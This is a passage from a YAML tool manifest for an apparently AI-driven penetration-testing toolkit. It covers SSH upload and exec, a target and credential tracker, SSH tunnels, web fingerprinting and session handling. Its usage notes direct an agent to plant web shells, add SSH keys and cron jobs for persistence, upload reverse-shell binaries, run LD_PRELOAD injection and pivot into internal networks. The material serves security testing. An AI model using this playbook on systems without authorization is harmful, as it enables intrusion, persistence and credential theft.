          timeout:
            type: integer
            default: 60
            description: Transfer timeout in seconds.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          content:
            type: string
            description: File contents as text.
          size:
            type: integer
            description: File size in bytes.
      copy_to:
        description: 'Upload text content to a remote host via SCP. Writes content to a local temp file, transfers via scp
          to the remote path. For text-based uploads: scripts, configs, web shells, cron entries. For binary uploads, use
          upload_binary instead.'
        when_to_use: 'To upload text content to a compromised target: (1) Upload enumeration scripts (linpeas.sh, linenum.sh)
          for privilege escalation, (2) Plant web shells in web-accessible directories, (3) Upload SSH authorized_keys for
          persistent access, (4) Write cron entries for persistence, (5) Upload configuration files for tool setup. For binary
          files (compiled exploits, ELF binaries), use upload_binary instead.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          content:
            type: string
            required: true
            description: Text content to upload (scripts, configs, web shells, etc.).
          remote_path:
            type: string
            required: true
            description: Destination path on remote host (e.g., '/tmp/linpeas.sh', '/var/www/html/shell.php').
          port:
            type: integer
            default: 22
            description: SSH port.
          timeout:
            type: integer
            default: 60
            description: Transfer timeout in seconds.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          size:
            type: integer
            description: Uploaded content size in bytes.
      upload_binary:
        description: Upload a binary file to a remote host via base64 chunked transfer over SSH. Splits the binary into 50KB
          chunks, base64-encodes each chunk, and appends to the remote file via 'echo <chunk> | base64 -d >> <path>'. Optionally
          makes the file executable (chmod +x, default true). Verifies upload with 'ls -la' and 'file' commands. Requires
          base64 on the remote host (present on virtually all Linux systems).
        when_to_use: 'To upload compiled exploits, ELF binaries, or other non-text files to a compromised target. Common uses:
          (1) Upload a compiled C exploit (kernel exploit, SUID exploit) built locally or via exploit-runner, (2) Upload a
          statically-compiled tool (nmap, socat, chisel) for pivoting, (3) Upload a reverse shell binary, (4) Upload pspy
          for process monitoring. The chunking approach works even when SCP is blocked but SSH exec works. For text files
          (scripts, configs), use copy_to instead — it''s simpler.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          content_base64:
            type: string
            required: true
            description: Binary file content as base64-encoded string.
          remote_path:
            type: string
            required: true
            description: Destination path on remote host (e.g., '/tmp/exploit', '/dev/shm/chisel').
          executable:
            type: boolean
            default: true
            description: Run chmod +x on the file after upload. Default true.
          chunk_size:
            type: integer
            default: 50000
            description: Chunk size for transfer in bytes (before base64 encoding).
          port:
            type: integer
            default: 22
            description: SSH port.
          timeout:
            type: integer
            default: 300
            description: Total timeout for all chunks. 300s default handles multi-MB files.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          size:
            type: integer
            description: Total uploaded file size in bytes.
          chunks:
            type: integer
            description: Number of chunks transferred.
          verified:
            type: boolean
            description: Whether upload was verified via ls and file commands.
      run_script:
        description: Upload a script to /tmp on the remote host via SCP, make it executable, execute it with the specified
          interpreter, and delete the temp file afterward. Combines copy_to + exec in one call. Script runs with the SSH user's
          permissions. Returns stdout, stderr, and exit code.
        when_to_use: 'For running multi-line scripts that are too complex for exec or shell. Common uses: (1) Run custom enumeration
          scripts — check for SUID binaries, writable directories, cron jobs, (2) Run linpeas.sh or linenum.sh content directly
          (paste script content, no need to wget), (3) Execute multi-step privilege escalation chains, (4) Run Python scripts
          on the target for exploitation. Use interpreter=''/usr/bin/python3'' for Python scripts, ''/bin/sh'' for POSIX-compatible
          scripts.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          script:
            type: string
            required: true
            description: Full script content to upload and execute.
          interpreter:
            type: string
            default: /bin/bash
            description: 'Script interpreter path. Common: ''/bin/bash'', ''/bin/sh'', ''/usr/bin/python3'', ''/usr/bin/perl''.'
          port:
            type: integer
            default: 22
            description: SSH port.
          timeout:
            type: integer
            default: 120
            description: Execution timeout in seconds.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          exit_code:
            type: integer
            description: Script exit code.
          stdout:
            type: string
            description: Script standard output.
          stderr:
            type: string
            description: Script standard error.
      background:
        description: Execute a detached background process on a remote host that survives SSH session disconnect. Uses nohup
          + disown to ensure persistence. Supports environment variable injection (exported before the command), output file
          capture, PID file writing, and a check command for verifying the process later. Environment variables are exported
          via 'export KEY=VALUE && ...' prefix.
        when_to_use: 'For processes that must persist after the SSH connection ends. Key use cases: (1) LD_PRELOAD or PYTHONPATH
          injection exploits — set env={''LD_PRELOAD'': ''/tmp/evil.so''} and run a SUID binary, (2) Race condition exploits
          — start a persistent process while racing in another SSH session, (3) Start a reverse shell listener or file watcher
          on the target, (4) Run long-running enumeration (pspy, tcpdump) with output capture. Use pid_file to track the process
          and return_check_command=true to get a ''ps -p <pid>'' command for later status checks.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          command:
            type: string
            required: true
            description: Command to run in the background. Wrapped in 'nohup bash -c "..." & disown'.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          port:
            type: integer
            default: 22
            description: SSH port.
          env:
            type: object
            description: Environment variables to export before running the command. Each key-value pair becomes 'export KEY=VALUE'.
              Use for LD_PRELOAD, PYTHONPATH, PATH manipulation exploits.
          output_file:
            type: string
            description: Remote file path to capture stdout/stderr. Without this, output goes to /dev/null.
          pid_file:
            type: string
            description: Remote file path to write the process PID. Enables later process management (kill, status check).
          return_check_command:
            type: boolean
            default: false
            description: If true, returns a 'ps -p <pid>' command string for verifying the process is still running.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          success:
            type: boolean
            description: Whether the background process was started successfully.
          pid:
            type: string
            description: Process ID (only if pid_file was specified).
          output_file:
            type: string
            description: Path to the output capture file.
          check_command:
            type: string
            description: Command to verify process status (only if return_check_command=true).
  target-tracker:
    name: target-tracker
    version: '1.0'
    description: 'Track target state throughout a penetration test engagement. 17 methods in 6 categories: targets (add_target,
      get_target, list_targets), ports/services (add_port), credentials (add_credential, update_credential, get_credentials),
      vulnerabilities (add_vulnerability, update_vulnerability), sessions (add_session, remove_session), loot (add_loot),
      attacks (record_attack, get_attack_history), ownership (mark_owned), notes (add_note), reporting (get_summary, suggest_next_steps).
      In-memory state persists across calls within a single container session. Does NOT require network — runs locally.'
    image: ghcr.io/silicon-works/mcp-tools-target-tracker:latest
    image_size_mb: 80
    capabilities:
    - state_tracking
    - credential_management
    - vulnerability_tracking
    - attack_history
    - loot_tracking
    - session_management
    routing:
      use_for:
      - track discovered ports and services on target hosts during enumeration
      - store and manage credentials found during penetration test (passwords, hashes, SSH keys)
      - record discovered vulnerabilities with CVE and severity for reporting
      - log attack attempts and results to avoid retesting and track progress
      - register active shell and SSH sessions on exploited targets
      - record retrieved loot (flags, config files, database dumps, SSH keys)
      - mark target as owned at user or root level
      - get engagement summary and suggested next steps based on current state
      never_use_for:
      - actual scanning or exploitation
      - credential testing
      triggers:
      - track target
      - store credential
      - record vulnerability
      - attack history
      - next steps
      - engagement summary
      - mark owned
      prefer_over: []
    phases:
    - reconnaissance
    - enumeration
    - exploitation
    - post-exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    methods:
      add_target:
        description: Add or update a target host
        when_to_use: When you discover a new target IP or want to update target info
        params:
          ip:
            type: string
            required: true
            description: Target IP address
          hostname:
            type: string
            description: Target hostname
          os:
            type: string
            description: Operating system
          os_version:
            type: string
            description: OS version
          tags:
            type: array
            description: Tags for categorization
        returns:
          ip:
            type: string
            description: Target IP
      get_target:
        description: Get complete state for a target
        when_to_use: To review all known information about a target
        params:
          ip:
            type: string
            required: true
            description: Target IP address
        returns:
          target:
            type: object
            description: Complete target state
      list_targets:
        description: List all tracked targets
        when_to_use: To see all targets in the engagement
        params:
          filter_owned:
            type: boolean
            description: Only show owned targets
          filter_tag:
            type: string
            description: Filter by tag
        returns:
          targets:
            type: array
            description: List of targets
      add_port:
        description: Add discovered port/service to target
        when_to_use: After port scanning to record discovered services
        params:
          ip:
            type: string
            required: true
            description: Target IP
          port:
            type: integer
            required: true
            description: Port number
          protocol:
            type: string
            default: tcp
            description: Protocol (tcp/udp)
          service:
            type: string
            description: Service name
          version:
            type: string
            description: Service version
          banner:
            type: string
            description: Service banner
        returns:
          success:
            type: boolean
            description: Whether port was added
      add_credential:
        description: Add discovered credential
        when_to_use: When you find a username, password, or hash
        params:
          ip:
            type: string
            required: true
            description: Target IP
          username:
            type: string
            required: true
            description: Username
          password:
            type: string
            description: Password
          hash:
            type: string
            description: Password hash
          private_key:
            type: string
            description: SSH private key
          service:
            type: string
            description: Service (ssh, smb, web)
          source:
            type: string
            description: Where credential was found
          status:
            type: string
            enum:
            - discovered
            - testing
            - valid
            - invalid
            default: discovered
            description: Credential status
        returns:
          credential_id:
            type: string
            description: ID of added credential
      update_credential:
        description: Update credential status after testing
        when_to_use: After testing a credential to mark it valid or invalid
        params:
          ip:
            type: string
            required: true
            description: Target IP
          credential_id:
            type: string
            required: true
            description: Credential ID
          status:
            type: string
            required: true
            enum:
            - discovered
            - testing
            - valid
            - invalid
            - expired
            description: New status
          notes:
            type: string
            description: Additional notes
        returns:
          success:
            type: boolean
            description: Whether update succeeded
      get_credentials:
        description: Get credentials for a target
        when_to_use: To retrieve stored credentials for a target
        params:
          ip:
            type: string
            required: true
            description: Target IP
          status:
            type: string
            enum:
            - discovered
            - testing
            - valid
            - invalid
            - expired
            description: Filter by status
          service:
            type: string
            description: Filter by service
        returns:
          credentials:
            type: array
            description: List of credentials
      add_vulnerability:
        description: Add discovered vulnerability
        when_to_use: When you identify a potential vulnerability
        params:
          ip:
            type: string
            required: true
            description: Target IP
          name:
            type: string
            required: true
            description: Vulnerability name
          cve:
            type: string
            description: CVE identifier
          severity:
            type: string
            enum:
            - critical
            - high
            - medium
            - low
            description: Severity level
          affected_component:
            type: string
            description: Affected service/component
          description:
            type: string
            description: Vulnerability description
          exploit_available:
            type: boolean
            default: false
            description: Is exploit available
        returns:
          vuln_id:
            type: string
            description: ID of added vulnerability
      update_vulnerability:
        description: Update vulnerability status
        when_to_use: After confirming or exploiting a vulnerability
        params:
          ip:
            type: string
            required: true
            description: Target IP
          vuln_id:
            type: string
            required: true
            description: Vulnerability ID
          status:
            type: string
            required: true
            enum:
            - potential
            - confirmed
            - exploited
            - patched
            description: New status
          exploit_used:
            type: string
            description: Exploit that was used
          notes:
            type: string
            description: Additional notes
        returns:
          success:
            type: boolean
            description: Whether update succeeded
      add_session:
        description: Register an active session on target
        when_to_use: When you establish a shell or SSH session
        params:
          ip:
            type: string
            required: true
            description: Target IP
          session_id:
            type: string
            required: true
            description: Session ID (from shell-session)
          session_type:
            type: string
            required: true
            enum:
            - ssh
            - reverse_shell
            - web_shell
            description: Session type
          user:
            type: string
            description: User context
          privilege_level:
            type: string
            enum:
            - user
            - root
            - system
            description: Privilege level
        returns:
          success:
            type: boolean
            description: Whether session was registered
      remove_session:
        description: Remove closed session
        when_to_use: When a session is closed or dies
        params:
          ip:
            type: string
            required: true
            description: Target IP
          session_id:
            type: string
            required: true
            description: Session ID
        returns:
          success:
            type: boolean
            description: Whether session was removed
      add_loot:
        description: Record retrieved file or data
        when_to_use: When you retrieve a flag, config file, or sensitive data
        params:
          ip:
            type: string
            required: true
            description: Target IP
          name:
            type: string
            required: true
            description: Loot name/filename
          loot_type:
            type: string
            default: file
            enum:
            - file
            - hash
            - key
            - config
            - database
            - flag
            description: Type of loot
          path:
            type: string
            description: Original path on target
          content_preview:
            type: string
            description: Preview of content
          notes:
            type: string
            description: Additional notes
        returns:
          loot_id:
            type: string
            description: ID of added loot
      record_attack:
        description: Record an attack attempt
        when_to_use: To log what attacks have been tried and their results
        params:
          ip:
            type: string
            required: true
            description: Target IP
          attack_type:
            type: string
            required: true
            description: Type of attack
          target_service:
            type: string
            description: Target service/port
          tool_used:
            type: string
            description: Tool used
          payload:
            type: string
            description: Payload used
          success:
            type: boolean
            required: true
            description: Was attack successful
          result:
            type: string
            description: Result description
        returns:
          attack_id:
            type: string
            description: ID of recorded attack
      get_attack_history:
        description: Get attack history for target
        when_to_use: To see what has already been tried
        params:
          ip:
            type: string
            required: true
            description: Target IP
          attack_type:
            type: string
            description: Filter by attack type
          success_only:
            type: boolean
            description: Only show successful attacks
        returns:
          attacks:
            type: array
            description: List of attack attempts
      mark_owned:
        description: Mark target as owned
        when_to_use: When you achieve user or root access
        params:
          ip:
            type: string
            required: true
            description: Target IP
          level:
            type: string
            required: true
            enum:
            - user
            - root
            description: Ownership level
        returns:
          success:
            type: boolean
            description: Whether target was marked
      add_note:
        description: Add a note to target
        when_to_use: To record observations or important findings
        params:
          ip:
            type: string
            required: true
            description: Target IP
          note:
            type: string
            required: true
            description: Note content
        returns:
          success:
            type: boolean
            description: Whether note was added
      get_summary:
        description: Get engagement summary
        when_to_use: To get an overview of the entire engagement
        params: {}
        returns:
          summary:
            type: object
            description: Engagement statistics
      suggest_next_steps:
        description: Get suggested next steps based on current state
        when_to_use: When unsure what to do next
        params:
          ip:
            type: string
            description: Target IP (optional, for specific target)
        returns:
          suggestions:
            type: array
            description: List of suggested actions
  tunnel:
    name: tunnel
    version: '1.0'
    description: 'SSH tunnel and SOCKS5 proxy manager for accessing remote localhost-only services and pivoting into internal
      networks. 5 methods: forward (local port forwarding via ''ssh -L''), socks (dynamic port forwarding via ''ssh -D'' for
      SOCKS5 proxy), list (show active tunnels), close (stop one tunnel), close_all (cleanup). Tunnels run as background SSH
      processes managed by PID. Supports password (sshpass) and private key authentication. Auto-assigns local ports when
      local_port=0. Requires host network mode so tunnels are accessible from other MCP containers.'
    image: ghcr.io/silicon-works/mcp-tools-tunnel:latest
    image_size_mb: 100
    capabilities:
    - port_forwarding
    - socks_proxy
    - pivoting
    - tunnel_management
    phases:
    - post-exploitation
    requirements:
      network: true
      privileged: false
      network_mode: host
      network_mode_reason: Tunnels must be accessible from other containers
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - forward remote localhost-only port to local port via SSH
      - create SOCKS5 proxy through SSH for pivoting to internal network
      - access MySQL or web apps bound to 127.0.0.1 on remote host
      - pivot through compromised host to reach internal machines
      - tunnel traffic through SSH to bypass firewall rules
      never_use_for:
      - direct SSH command execution (use ssh)
      - port scanning through tunnel (use nmap with proxychains)
      - file transfer (use ssh copy_to/copy_from)
      triggers:
      - tunnel
      - port forward
      - SOCKS
      - pivot
      - proxy
      - internal network
      - localhost service
      - ssh -L
      - ssh -D
      prefer_over:
      - ssh
    methods:
      forward:
        description: Create an SSH local port forward (ssh -L) that maps a local port to a remote host:port through the SSH
          connection. Traffic to localhost:<local_port> is tunneled through the SSH server and forwarded to <remote_host>:<remote_port>.
          Runs as a background SSH process. Use local_port=0 for auto-assignment.
        when_to_use: 'To access services bound to 127.0.0.1 on the target that aren''t exposed externally. Common scenarios:
          (1) MySQL on 127.0.0.1:3306 — forward to local port, then use mysql tool against localhost, (2) Web apps on 127.0.0.1:8080
          — forward to local port, then browse with curl/playwright, (3) Internal admin panels, Redis (6379), MongoDB (27017),
          etc. Also works for reaching services on internal machines through the SSH host by setting remote_host to the internal
          IP.'
        params:
          ssh_host:
            type: string
            required: true
            description: SSH server to tunnel through.
          ssh_user:
            type: string
            required: true
            description: SSH username.
          ssh_password:
            type: string
            description: SSH password.
          ssh_key:
            type: string
            description: SSH private key content (PEM or OpenSSH format).
          ssh_port:
            type: integer
            default: 22
            description: SSH server port.
          remote_host:
            type: string
            default: 127.0.0.1
            description: Host to forward to (from SSH server's perspective). Default '127.0.0.1' for localhost services. Set
              to internal IP for pivoting.
          remote_port:
            type: integer
            required: true
            description: Port on remote_host to forward to (e.g., 3306 for MySQL, 8080 for web app).
          local_port:
            type: integer
            default: 0
            description: Local port to listen on. 0=auto-assign an available port.
        returns:
          tunnel_id:
            type: string
            description: Tunnel ID for list and close.
          local_port:
            type: integer
            description: Local port the tunnel is listening on (use this to connect).
          connect_to:
            type: string
            description: Address to connect to (e.g., '127.0.0.1:9999').
      socks:
        description: Create a SOCKS5 proxy via SSH dynamic port forwarding (ssh -D). All traffic sent through the SOCKS proxy
          is tunneled through the SSH server and exits from the SSH server's network. Enables full network pivoting — any
          tool that supports SOCKS5 can reach internal hosts.
        when_to_use: 'When you need to access multiple services on an internal network through a compromised host. Instead
          of creating individual port forwards, a SOCKS proxy lets you reach ANY internal host:port. Use with proxychains
          or tool-specific SOCKS settings. Common scenario: compromised DMZ host → SOCKS proxy → scan/exploit internal network.
          Default port 1080.'
        params:
          ssh_host:
            type: string
            required: true
            description: SSH server to create SOCKS proxy through.
          ssh_user:
            type: string
            required: true
            description: SSH username.
          ssh_password:
            type: string
            description: SSH password.
          ssh_key:
            type: string
            description: SSH private key content.
          ssh_port:
            type: integer
            default: 22
            description: SSH server port.
          local_port:
            type: integer
            default: 1080
            description: Local port for SOCKS5 proxy.
        returns:
          tunnel_id:
            type: string
            description: Tunnel ID for list and close.
          proxy_url:
            type: string
            description: SOCKS5 proxy URL (e.g., 'socks5://127.0.0.1:1080').
      list:
        description: List all active SSH tunnels and SOCKS proxies with their type, ports, SSH host, and process status.
        when_to_use: To check which tunnels are running, verify a tunnel is still alive, or find the local port for a tunnel.
        params: {}
        returns:
          tunnels:
            type: array
            description: 'Active tunnels with: id, type (forward/socks), local_port, remote details, ssh_host.'
          count:
            type: integer
            description: Number of active tunnels.
      close:
        description: Close a specific tunnel by killing its background SSH process.
        when_to_use: When a specific tunnel is no longer needed. Frees the local port for reuse.
        params:
          tunnel_id:
            type: string
            required: true
            description: Tunnel ID to close.
        returns:
          tunnel_id:
            type: string
            description: ID of the closed tunnel.
      close_all:
        description: Close all active tunnels and SOCKS proxies.
        when_to_use: At the end of an engagement or when resetting the network setup.
        params: {}
        returns:
          closed:
            type: array
            description: List of closed tunnel IDs.
  web-fingerprint:
    name: web-fingerprint
    version: '1.0'
    description: Web technology fingerprinting tool that identifies CMS platforms (WordPress, Joomla, Drupal, XWiki), server-side
      frameworks (Laravel, Django, Rails, ASP.NET, Spring, Express), web servers (Apache, nginx, IIS, Tomcat, Jetty), JavaScript
      frameworks (React, Vue.js, Angular, jQuery), database management UIs (phpMyAdmin, Adminer), DevOps tools (GitLab, Jenkins,
      Grafana, Kibana), and CDN/infrastructure (CloudFlare, AWS ELB, Varnish) using signature-based matching against HTTP
      headers, response body patterns, meta tags, and cookies. Also checks security headers and calculates favicon hashes.
    image: ghcr.io/silicon-works/mcp-tools-web-fingerprint:latest
    image_size_mb: 100
    capabilities:
    - technology_detection
    - cms_identification
    - framework_detection
    - server_fingerprinting
    - security_header_analysis
    phases:
    - reconnaissance
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - technology detection and web stack identification
      - CMS identification WordPress Joomla Drupal
      - framework detection Laravel Django Rails ASP.NET Spring Express
      - web server fingerprinting Apache nginx IIS Tomcat
      - security header analysis and misconfiguration check
      - identify technology stack behind a web application
      - JavaScript framework detection React Vue Angular
      - favicon hash calculation for Shodan lookup
      - HTTP header analysis and information disclosure detection
      - DevOps tool detection GitLab Jenkins Grafana Kibana
      never_use_for:
      - vulnerability scanning
      - port scanning
      - exploitation
      triggers:
      - fingerprint
      - technology stack
      - what technology
      - CMS
      - identify framework
      - security headers
      - favicon hash
      prefer_over:
      - nuclei
    methods:
      fingerprint:
        description: 'Fingerprint web technologies on a target URL using signature-based matching against HTTP headers, HTML
          body patterns, meta generator tags, and cookies. Detects 25 technologies across 7 categories: CMS (WordPress, Joomla,
          Drupal, XWiki), frameworks (Laravel, Django, Rails, ASP.NET, Spring, Express), web servers (Apache, nginx, IIS,
          Tomcat, Jetty), JS frameworks (React, Vue.js, Angular, jQuery), database UIs (phpMyAdmin, Adminer), CDN/infrastructure
          (CloudFlare, AWS ELB, Varnish), and DevOps tools (GitLab, Jenkins, Grafana, Kibana). Each detection includes a confidence
          score (0-100) based on how many signature types matched (header=30, body=20, meta=40, cookie=25). Also extracts
          page title, server header, cookie names, and internal paths from href/src/action attributes.'
        when_to_use: 'As the first step after discovering an HTTP/HTTPS service to identify the technology stack before choosing
          specific scanning tools. Results guide next steps: WordPress detected → use wpscan, Laravel/Django detected → test
          framework-specific vulnerabilities, phpMyAdmin/Adminer detected → try default credentials, Jenkins/GitLab detected
          → check for unauthenticated access. Run this before nikto/nuclei/zap to understand what you''re dealing with. Lighter
          and faster than nuclei''s tech_detect method.'
        params:
          url:
            type: string
            required: true
            description: Target URL to fingerprint (e.g., 'http://10.10.10.1', 'https://target.htb:8443'). Scheme is auto-added
              as http:// if omitted.
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP 3xx redirects to final destination. Set to false to analyze redirect behavior itself
              (e.g., detecting redirect-based authentication).
          timeout:
            type: integer
            default: 30
            description: HTTP request timeout in seconds
          user_agent:
            type: string
            description: 'Custom User-Agent header. Default: Chrome-like UA string. Change if target blocks automated scanners
              or serves different content based on UA.'
        returns:
          technologies:
            type: array
            description: 'Detected technologies, each with ''technology'' name, ''confidence'' score (0-100), and ''matches''
              array showing what matched (e.g., ''Header: X-Powered-By'', ''Body: /wp-content/'', ''Meta: generator=WordPress
              6.1'', ''Cookie: laravel_session'')'
          server:
            type: string
            description: Server header value (e.g., 'Apache/2.4.41', 'nginx/1.18.0', 'Microsoft-IIS/10.0')
          title:
            type: string
            description: HTML page title extracted from <title> tag
          interesting_paths:
            type: array
            description: Internal paths extracted from href, src, and action attributes in HTML (up to 50, relative paths
              starting with /)
          status_code:
            type: integer
            description: HTTP response status code
          cookies:
            type: array
            description: Cookie names set by the server (e.g., ['PHPSESSID', 'laravel_session', 'csrftoken'])
      headers:
        description: 'Fetch and categorize all HTTP response headers into 4 groups: security headers (Content-Security-Policy,
          Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy,
          Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy), server info headers (Server, X-Powered-By, X-AspNet-Version,
          X-Generator), cache headers (Cache-Control, Expires, Pragma, ETag, Last-Modified), and other headers.'
        when_to_use: To get a full categorized view of all HTTP headers returned by the target. Use this for initial reconnaissance
          to understand server configuration, identify technology versions from Server/X-Powered-By headers, check caching
          behavior, and spot unusual or custom headers that may reveal application internals. For specifically checking security
          header compliance, use the security_headers method instead.
        params:
          url:
            type: string
            required: true
            description: Target URL (e.g., 'http://10.10.10.1'). Scheme auto-added as http:// if omitted.
          timeout:
            type: integer
            default: 30
            description: HTTP request timeout in seconds
        returns:
          security_headers:
            type: object
            description: Security-related headers found (CSP, HSTS, X-Frame-Options, etc.)
          server_headers:
            type: object
            description: Server information headers (Server, X-Powered-By, X-AspNet-Version, X-Generator)
          cache_headers:
            type: object
            description: Cache control headers (Cache-Control, Expires, Pragma, ETag, Last-Modified)
          other_headers:
            type: object
            description: All remaining headers not in the above categories
          status_code:
            type: integer
            description: HTTP response status code
      security_headers:
        description: 'Audit 7 security headers against best practices and flag misconfigurations. Checks: Strict-Transport-Security
          (HSTS — forces HTTPS, flags max-age < 1 year), Content-Security-Policy (CSP — prevents XSS/injection), X-Content-Type-Options
          (prevents MIME sniffing), X-Frame-Options (prevents clickjacking, flags values other than DENY/SAMEORIGIN), X-XSS-Protection
          (legacy XSS filter), Referrer-Policy (controls referrer leakage), Permissions-Policy (controls browser features).
          Also detects information disclosure via Server, X-Powered-By, X-AspNet-Version, and X-Generator headers that reveal
          technology and version info.'
        when_to_use: 'After identifying HTTP/HTTPS services to audit security header configuration. Missing or misconfigured
          security headers are common findings in penetration test reports. Run this to check for: missing HSTS (allows SSL
          stripping), missing CSP (enables XSS), missing X-Frame-Options (enables clickjacking), weak HSTS max-age, and server
          version disclosure. Results include a score (e.g., ''4/7'') and severity ratings per finding.'
        params:
          url:
            type: string
            required: true
            description: Target URL (e.g., 'https://target.htb'). Scheme auto-added as http:// if omitted.
          timeout:
            type: integer
            default: 30
            description: HTTP request timeout in seconds
        returns:
          missing_headers:
            type: array
            description: Security headers not present, each with header name, description of what it protects against, and
              severity (medium/low/info)
          present_headers:
            type: array
            description: Security headers found, each with header name, actual value, and description
          issues:
            type: array
            description: 'Misconfigurations found: weak X-Frame-Options values, short HSTS max-age (<1 year), information
              disclosure from Server/X-Powered-By/X-AspNet-Version/X-Generator headers'
          score:
            type: string
            description: Security header compliance score as 'present/total' (e.g., '4/7')
      favicon_hash:
        description: Download /favicon.ico from the target and calculate its MurmurHash3 (mmh3) hash for Shodan favicon search,
          plus MD5 for general identification. The mmh3 hash is Shodan-compatible — the generated Shodan query will produce
          accurate results. Also returns MD5 for cross-target favicon comparison.
        when_to_use: 'During reconnaissance to identify the web application or framework by its favicon. Many default application
          installations (e.g., Spring Boot, Apache Tomcat, Grafana, Jenkins) have recognizable default favicons. The hash
          can be used to: identify the application if no other indicators are present, find similar servers via Shodan using
          the mmh3 hash (http.favicon.hash:<hash>), and compare favicons across different ports/vhosts on the same target
          using the MD5 hash.'
        params:
          url:
            type: string
            required: true
            description: Target URL — the method will automatically request /favicon.ico from the target's root (e.g., 'http://10.10.10.1'
              → fetches 'http://10.10.10.1/favicon.ico')
          timeout:
            type: integer
            default: 30
            description: HTTP request timeout in seconds
        returns:
          favicon_url:
            type: string
            description: Full URL that was fetched (e.g., 'http://10.10.10.1/favicon.ico')
          size_bytes:
            type: integer
            description: Favicon file size in bytes
          md5:
            type: string
            description: MD5 hash of the favicon file content (for general identification)
          mmh3:
            type: integer
            description: MurmurHash3 hash of the base64-encoded favicon (Shodan-compatible)
          shodan_query:
            type: string
            description: Ready-to-use Shodan search query string (e.g., 'http.favicon.hash:-12345678')
  web-session:
    name: web-session
    version: '1.0'
    description: 'Web session state management for authenticated security testing. 7 methods: login (POST form login and capture
      session cookies), get_cookies (retrieve stored cookies in header/dict/raw format for use with other tools), set_cookies
      (import cookies from browser or other source), request (make authenticated HTTP requests with stored session), list_sessions
      (show all stored sessions), extract_csrf (extract CSRF tokens from pages via regex), delete_session (cleanup). Named
      sessions persist across calls within a container session. Cookies can be exported as header strings for curl, ffuf,
      sqlmap, etc.'
    image: ghcr.io/silicon-works/mcp-tools-web-session:latest
    image_size_mb: 100
    capabilities:
    - session_management
    - cookie_handling
    - authenticated_requests
    - csrf_extraction
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - login to web application and capture session cookies for reuse across tools
      - store and manage authenticated session cookies for multi-step web testing
      - extract CSRF tokens from web pages for form submission attacks
      - make authenticated HTTP requests using stored session cookies
      - export session cookies as header string for curl ffuf sqlmap and other tools
      - import cookies from browser or Playwright session for use in CLI tools
      never_use_for:
      - unauthenticated scanning
      - port scanning
      - brute-force login
      triggers:
      - session
      - cookie
      - CSRF
      - authenticated request
      - login session
      - web session
      prefer_over:
      - curl
    methods:
      login:
        description: Perform login and capture session cookies
        when_to_use: To authenticate to a web application and store session for reuse
        params:
          url:
            type: string
            required: true
            description: Login URL endpoint
          username_field:
            type: string
            default: username
            description: Form field name for username
          password_field:
            type: string
            default: password
            description: Form field name for password
          username:
            type: string
            required: true
            description: Username to login with
          password:
            type: string
            required: true
            description: Password to login with
          extra_fields:
            type: object
            description: Additional form fields (e.g., CSRF token)
          session_name:
            type: string
            default: default
            description: Name to store this session under
          success_indicator:
            type: string
            description: Text that indicates successful login
          failure_indicator:
            type: string
            description: Text that indicates failed login
          headers:
            type: object
            description: Custom HTTP headers
          timeout:
            type: integer
            default: 30
            description: Request timeout in seconds
        returns:
          login_success:
            type: boolean
            description: Whether login succeeded
          cookies:
            type: object
            description: Captured session cookies
          cookie_header:
            type: string
            description: Cookie string for use in other tools
      get_cookies:
        description: Get cookies from a stored session
        when_to_use: To retrieve cookies for use with other tools (curl, ffuf, etc.)
        params:
          session_name:
            type: string
            default: default
            description: Session name to retrieve
          format:
            type: enum
            values:
            - header
            - dict
            - raw
            default: header
            description: Output format
        returns:
          cookies:
            type: object
            description: Session cookies
          cookie_header:
            type: string
            description: Cookie header string
      set_cookies:
        description: Manually set cookies for a session
        when_to_use: To import cookies from browser or other source
        params:
          cookies:
            type: string
            required: true
            description: 'Cookie string (format: ''name1=value1; name2=value2'')'
          session_name:
            type: string
            default: default
            description: Session name to store under
          domain:
            type: string
            description: Cookie domain
        returns:
          cookies:
            type: object
            description: Parsed cookies
      request:
        description: Make authenticated request using stored session
        when_to_use: To make requests with session cookies automatically included
        params:
          url:
            type: string
            required: true
            description: URL to request
          method:
            type: enum
            values:
            - GET
            - POST
            - PUT
            - DELETE
            default: GET
            description: HTTP method
          session_name:
            type: string
            default: default
            description: Session to use
          data:
            type: string
            description: Request body data
          headers:
            type: object
            description: Additional HTTP headers
          timeout:
            type: integer
            default: 30
            description: Request timeout
        returns:
          status_code:
            type: integer
            description: HTTP response status
          body:
            type: string
            description: Response body
      list_sessions:
        description: List all stored sessions
        when_to_use: To see available authenticated sessions
        params: {}
        returns:
          sessions:
            type: array
            description: List of stored sessions
      extract_csrf:
        description: Extract CSRF token from a page
        when_to_use: To get CSRF token for form submissions
        params:
          url:
            type: string
            required: true
            description: URL to fetch
          session_name:
            type: string
            default: default
            description: Session to use (if any)
          token_pattern:
            type: string
            description: Regex pattern to extract token
          timeout:
            type: integer
